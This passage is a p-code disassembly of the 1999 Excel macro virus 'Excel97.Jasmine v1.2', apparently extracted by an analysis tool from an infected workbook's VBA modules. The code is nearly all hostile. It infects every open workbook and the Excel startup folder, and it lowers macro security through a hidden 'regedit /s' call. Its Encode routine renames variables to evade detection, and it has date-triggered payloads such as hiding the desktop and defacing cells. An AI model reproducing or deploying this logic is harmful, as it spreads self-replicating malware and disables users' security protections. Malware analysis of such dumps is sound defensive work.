' 	BoS 0x0000 
' 	LitStr 0x000C "Sa4Ym1Ho4Wi0"
' 	LitDI2 0x000C 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Bp0Ah5Ak9Jr3Qa5Yo3Ze6"
' 	LitDI2 0x000D 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Dj4Rb0Vn7Kv8Uz2Yx3Ym1"
' 	LitDI2 0x000E 
' 	ArgsSt varray 0x0001 
' Line #116:
' 	ArgsCall Read 0x0000 
' Line #117:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #118:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #119:
' 	Ld PolyVal 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0030 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyVal 
' Line #120:
' 	StartForVariable 
' 	Next 
' Line #121:
' 	StartWithExpr 
' 	Ld Loc 
' 	With 
' Line #122:
' 	LitDI2 0x0001 
' 	St Do0Nw3Ag1Pz6Yk6 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St Sa4Ym1Ho4Wi0 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' Line #123:
' 	Ld i 
' 	ArgsLd varray 0x0001 
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	Ld Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	Ld Sa4Ym1Ho4Wi0 
' 	Ld Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #124:
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strVal 
' Line #125:
' 	Ld strVal 
' 	Ld Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld PolyVal 
' 	Concat 
' 	Ld strVal 
' 	Ld Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strVal 
' Line #126:
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	Ld strVal 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #127:
' 	Ld Sa4Ym1Ho4Wi0 
' 	LitDI2 0x0001 
' 	Add 
' 	St Do0Nw3Ag1Pz6Yk6 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' Line #128:
' 	MemLdWith CountOfLines 
' 	St Sa4Ym1Ho4Wi0 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' Line #129:
' 	Loop 
' Line #130:
' 	EndWith 
' Line #131:
' 	LitStr 0x0000 ""
' 	St PolyVal 
' Line #132:
' 	StartForVariable 
' 	Next 
' Line #133:
' 	EndSub 
' Line #134:
' _VBA_PROJECT_CUR/VBA/Sheet2 - 10207 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Excel97.Jasmine v1.2"
' Line #1:
' 	QuoteRem 0x0000 0x001B "Copyright (c) 1999, cry0tek"
' Line #2:
' Line #3:
' 	Dim (Public) 
' 	VarDefn Yp3Wi1Ex3Iq8Iw1
' 	VarDefn Xc4Rc6Nb1Xh7Uc3Yy9 (As Boolean)
' Line #4:
' 	QuoteRem 0x0000 0x0007 "Jasmine"
' Line #5:
' 	FuncDefn (Private Sub WorkBook_Activate())
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	Dim 
' 	VarDefn Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 (As Object)
' Line #8:
' 	LitStr 0x000D "c:\remove.reg"
' 	St Eq7Jw1 
' 	BoS 0x0000 
' 	LitStr 0x002D "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	St Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #10:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #11:
' 	ArgsCall Read 0x0000 
' Line #12:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsCall (Call) Encode 0x0001 
' Line #14:
' 	LineCont 0x0004 08 00 03 00
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	MemLd CountOfLines 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	St Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' Line #15:
' 	GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	SetStmt 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Se3Hs8Xo2Ir2Rq4Kc9 
' Line #19:
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd New 
' 	St Wb9 
' Line #20:
' 	SetStmt 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld Wb9 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #22:
' 	LineCont 0x0004 0C 00 04 00
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsCall (Call) Encode 0x0001 
' 	EndIf 
' Line #23:
' 	LineCont 0x0004 0A 00 04 00
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	MemLd CountOfLines 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' Line #24:
' 	GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Next 
' Line #27:
' 	StartForVariable 
' 	Next 
' Line #28:
' 	Label Dj4Rb0Vn7Kv8Uz2Yx3Ym1 
' Line #29:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld Yp3Wi1Ex3Iq8Iw1 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #31:
' 	LitVarSpecial (True)
' 	St Yp3Wi1Ex3Iq8Iw1 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St Xc4Rc6Nb1Xh7Uc3Yy9 
' Line #32:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\BOOK1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #36:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' Line #37:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Ne 
' 	IfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	LitDI2 0x0006 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Ld Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	SetStmt 
' 	Ld ii 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Se3Hs8Xo2Ir2Rq4Kc9 
' Line #43:
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd New 
' 	St Wb9 
' Line #44:
' 	SetStmt 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	Set Infline 
' Line #45:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Infline 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Ne 
' 	IfBlock 
' Line #46:
' 	LitDI2 0x0001 
' 	Ld Wb9 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' 	LitDI2 0x0006 
' 	LitStr 0x001F "Private Sub WorkBook_Activate()"
' 	Ld Se3Hs8Xo2Ir2Rq4Kc9 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	StartForVariable 
' 	Next 
' Line #53:
' 	Ld Xc4Rc6Nb1Xh7Uc3Yy9 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #54:
' 	LitVarSpecial (False)
' 	St Xc4Rc6Nb1Xh7Uc3Yy9 
' Line #55:
' 	LitVarSpecial (True)
' 	ParamNamed savechanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #56:
' 	Ld Eq7Jw1 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #58:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x0013 "9.0\Excel\Security]"
' 	Concat 
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x001A "8.0\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x002C "8.0\New User\Settings\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 
' 	LitStr 0x001A "8.0\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #70:
' 	LitStr 0x000B "regedit /s "
' 	Ld Eq7Jw1 
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #71:
' 	Ld Eq7Jw1 
' 	ArgsCall Kill 0x0001 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	SelectCase 
' Line #75:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #76:
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #77:
' 	LitDI2 0x0006 
' 	LitDI2 0x000A 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #78:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #79:
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	MemStWith Heading 
' Line #80:
' 	LineCont 0x0004 0B 00 0C 00
' 	LitStr 0x0022 "Since the only time I see her near"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0017 "Is when I close my eyes"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0019 "Should I keep it that way"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0023 "The only way I can make her stay..."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	MemStWith Then 
' Line #81:
' 	LitDI2 0x0016 
' 	MemStWith Animation 
' Line #82:
' 	ArgsMemCallWith Show 0x0000 
' Line #83:
' 	EndWith 
' Line #84:
' 	LitDI2 0x000B 
' 	LitDI2 0x0014 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0258 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ForStep 
' Line #86:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St Yx1Kg4De8Bs6Sm1Jd5Ca0 
' Line #87:
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Concat 
' 	St j 
' Line #88:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #89:
' 	LitStr 0x000F "Excel97.Jasmine"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #90:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #91:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #92:
' 	LitStr 0x0005 "Arial"
' 	MemStWith New 
' Line #93:
' 	LitDI2 0x000A 
' 	MemStWith Size 
' Line #94:
' 	EndWith 
' Line #95:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #96:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #97:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	MemStWith ColorIndex 
' Line #98:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #99:
' 	EndWith 
' Line #100:
' 	LineCont 0x0004 05 00 05 00
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld Yx1Kg4De8Bs6Sm1Jd5Ca0 
' 	Concat 
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #101:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #102:
' 	StartForVariable 
' 	Next 
' Line #103:
' 	LitDI2 0x0015 
' 	LitDI2 0x001E 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #104:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0009 "NoDesktop"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #105:
' 	LitDI2 0x001F 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Case 
' 	CaseDone 
' Line #106:
' 	LitStr 0x0000 ""
' 	Ld vbInformation 
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	ArgsCall MsgBox 0x0003 
' Line #107:
' 	EndSelect 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Private Sub Encode(Loc As Object))
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn varray (As String)
' Line #113:
' 	Dim 
' 	VarDefn Do0Nw3Ag1Pz6Yk6 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Sa4Ym1Ho4Wi0 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Bp0Ah5Ak9Jr3Qa5Yo3Ze6 (As Long)
' Line #114:
' 	LitStr 0x0006 "Eq7Jw1"
' 	LitDI2 0x0001 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0018 "Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4"
' 	LitDI2 0x0002 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0018 "Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5"
' 	LitDI2 0x0003 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0012 "Se3Hs8Xo2Ir2Rq4Kc9"
' 	LitDI2 0x0004 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Wb9"
' 	LitDI2 0x0005 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001E "Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9"
' 	LitDI2 0x0006 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000F "Yp3Wi1Ex3Iq8Iw1"
' 	LitDI2 0x0007 
' 	ArgsSt varray 0x0001 
' Line #115:
' 	LitStr 0x0012 "Xc4Rc6Nb1Xh7Uc3Yy9"
' 	LitDI2 0x0008 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Yx1Kg4De8Bs6Sm1Jd5Ca0"
' 	LitDI2 0x0009 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000F "Do0Nw3Ag1Pz6Yk6"
' 	LitDI2 0x000A 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001B "Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1"
' 	LitDI2 0x000B 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000C "Sa4Ym1Ho4Wi0"
' 	LitDI2 0x000C 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Bp0Ah5Ak9Jr3Qa5Yo3Ze6"
' 	LitDI2 0x000D 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Dj4Rb0Vn7Kv8Uz2Yx3Ym1"
' 	LitDI2 0x000E 
' 	ArgsSt varray 0x0001 
' Line #116:
' 	ArgsCall Read 0x0000 
' Line #117:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #118:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #119:
' 	Ld PolyVal 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0030 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyVal 
' Line #120:
' 	StartForVariable 
' 	Next 
' Line #121:
' 	StartWithExpr 
' 	Ld Loc 
' 	With 
' Line #122:
' 	LitDI2 0x0001 
' 	St Do0Nw3Ag1Pz6Yk6 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St Sa4Ym1Ho4Wi0 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' Line #123:
' 	Ld i 
' 	ArgsLd varray 0x0001 
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	Ld Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	Ld Sa4Ym1Ho4Wi0 
' 	Ld Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #124:
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strVal 
' Line #125:
' 	Ld strVal 
' 	Ld Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld PolyVal 
' 	Concat 
' 	Ld strVal 
' 	Ld Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strVal 
' Line #126:
' 	Ld Do0Nw3Ag1Pz6Yk6 
' 	Ld strVal 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #127:
' 	Ld Sa4Ym1Ho4Wi0 
' 	LitDI2 0x0001 
' 	Add 
' 	St Do0Nw3Ag1Pz6Yk6 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 
' Line #128:
' 	MemLdWith CountOfLines 
' 	St Sa4Ym1Ho4Wi0 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Bp0Ah5Ak9Jr3Qa5Yo3Ze6 
' Line #129:
' 	Loop 
' Line #130:
' 	EndWith 
' Line #131:
' 	LitStr 0x0000 ""
' 	St PolyVal 
' Line #132:
' 	StartForVariable 
' 	Next 
' Line #133:
' 	EndSub 
' Line #134:
' _VBA_PROJECT_CUR/VBA/Sheet3 - 10207 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Excel97.Jasmine v1.2"
' Line #1:
' 	QuoteRem 0x0000 0x001B "Copyright (c) 1999, cry0tek"
' Line #2:
' Line #3:
' 	Dim (Public) 
' 	VarDefn Yp3Wi1Ex3Iq8Iw1
' 	VarDefn Xc4Rc6Nb1Xh7Uc3Yy9 (As Boolean)
' Line #4:
' 	QuoteRem 0x0000 0x0007 "Jasmine"
' Line #5:
' 	FuncDefn (Private Sub WorkBook_Activate())
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	Dim 
' 	VarDefn Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 (As Object)
